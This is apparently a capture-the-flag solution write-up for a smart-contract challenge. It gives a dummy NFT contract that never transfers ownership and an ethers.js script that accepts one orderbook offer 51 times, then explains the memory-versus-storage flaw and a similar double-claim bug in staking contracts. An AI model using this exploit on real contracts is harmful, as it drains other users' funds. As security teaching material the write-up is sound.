# SPOILER

A simple dummy NFT that won't change ownership is needed.

```js
contract AttackNFT {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function ownerOf(uint256) external view returns (address) {
        return owner;
    }

    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external {
        //
    }
}
```

Then, an order can be placed for this NFT.

```js
[attacker, accomplice] = await ethers.getSigners();
const nft = await (await ethers.getContractFactory('AttackNFT', attacker)).deploy();

await orderbook.connect(accomplice).placeOffers([nft.address], [0], [ethers.utils.parseEther('1.25')], {
  value: ethers.utils.parseEther('1.25'),
});

const hash = await orderbook.getOfferHash(accomplice.address, nft.address, 0);
await orderbook.connect(attacker).acceptOffers(Array(51).fill(hash));
```

This order can be accepted multiple times, because there is a mismatch between
the orders stored in memory and the ones on-chain. In this case, the order value `price`
is being used to "block" future (profitable) fillings of the order. If this were directly
read from the contract state, this vulnerability would not be possible.

My experience so far mainly comes from looking at NFT contracts.
In particular, I've seen many staking contracts fall prey to this attack.

Often, there exists a `claimRewards(uint[] calldata tokenIds)` function
that first calculates the rewards in a loop and then afterwards, in another,
`lastClaimed[tokenId] = block.timestamp` is set.
Here, also, because of unexpected user-input, the rewards can be claimed multiple times.

This challenge combined this idea with the slight twist, that a non-standard NFT contract
must be used in order to bypass the ownership-check.
